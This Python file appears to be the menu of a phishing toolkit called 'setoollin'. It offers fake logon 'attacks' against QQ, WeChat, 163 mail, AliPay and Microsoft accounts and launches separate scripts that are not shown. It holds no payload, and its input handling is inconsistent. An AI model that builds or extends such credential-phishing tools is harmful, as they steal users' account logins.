print("")
print("")
print("===============================")
print("--setoollin>>Social Engineering")
print("===============================")
print("[*]A Method To Social Engineering")
print("")
print("")
#end the start logo
#==================

#==================
print("setoollin>>Social Engineering:List")
#the list of the Social Engineering Attack
print("")
print("1:-QQ logon") #finish the content
print("2:-QQ mail logon") #finish the content
print("3:-Wechat logon") #finish the content
print("4:-163 mail logon") #finish the content
print("5:-AliPay logon") #finish the content
print("6:-Microsoft logon") #finish the content
print("7:-back")
#==================


th = input("__setoollin>>Social Engineering>")

if th == "use qq attack" :
    print("Chose The QQ logon")
    import os
    os.system("python3 qqlogon.py")

    #===========================================

if th == "use qq mail attack" :
    print("Chose The QQ mail logon")
    import os
    os.system("python3 mail.py")

    #===========================================

if th == "use wechat attack" :
    print("Chose The Wechat logon")
    import os
    os.system("python3 wechat.py")

        #===========================================


if th == "use 163 mail attack":
    print("Chose The 163 mail logon")
    import os
    os.system("python3 163.py")

    #===========================================

if th == "use alipay attack":
    print("Chose The AliPay logon")
    import os
    os.system("python3 pay.py")

    #===========================================.

if th == "use microsoft attack" :
    import os
    os.system("python3 1.py")

#back the setoollin.py
if th == "7" :
    print("back")
    import os
    os.system("python3 setoollin.py -t manual")


else :
    import os
    os.system("python3 set.py")